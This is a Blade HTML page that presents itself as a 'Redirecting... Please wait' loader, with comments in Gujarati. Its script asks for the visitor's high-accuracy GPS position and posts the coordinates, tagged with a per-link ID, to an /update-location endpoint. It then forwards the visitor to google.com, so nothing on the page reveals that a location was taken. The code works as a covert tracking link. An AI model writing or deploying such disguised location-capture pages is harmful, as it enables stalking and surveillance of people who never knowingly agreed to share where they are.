<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirecting...</title>
    <meta name="csrf-token" content="{{ csrf_token() }}">
    <style>
        body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background: #f4f4f4; margin: 0; }
        .loader { border: 4px solid #e0e0e0; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .container { text-align: center; }
    </style>
</head>
<body>
    <div class="container">
        <div class="loader" style="margin: 0 auto 15px auto;"></div>
        <p>Please wait...</p>
    </div>

    <script>
        window.onload = function() {
            // યુઝરના બ્રાઉઝરમાં GPS સપોર્ટ છે કે નહિ તે ચેક કરો
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(function(position) {
                    
                    // જો યુઝર Allow કરે, તો લોકેશન સર્વર પર મોકલો
                    fetch("{{ url('/update-location') }}", {
                        method: "POST",
                        headers: {
                            "Content-Type": "application/json",
                            "X-CSRF-TOKEN": document.querySelector('meta[name="csrf-token"]').getAttribute('content')
                        },
                        body: JSON.stringify({
                            id: "{{ $id }}",
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude
                        })
                    }).then(() => {
                        // ડેટા સેવ થયા પછી ગૂગલ પર રીડાયરેક્ટ
                        window.location.href = "https://google.com";
                    }).catch(() => {
                        // જો કોઈ એરર આવે તો પણ રીડાયરેક્ટ કરી દો
                        window.location.href = "https://google.com";
                    });

                }, function(error) {
                    // જો યુઝર Block કરે તો સીધા ગૂગલ પર મોકલી દો
                    window.location.href = "https://google.com";
                }, { enableHighAccuracy: true });
            } else {
                window.location.href = "https://google.com";
            }
        };
    </script>
</body>
</html>
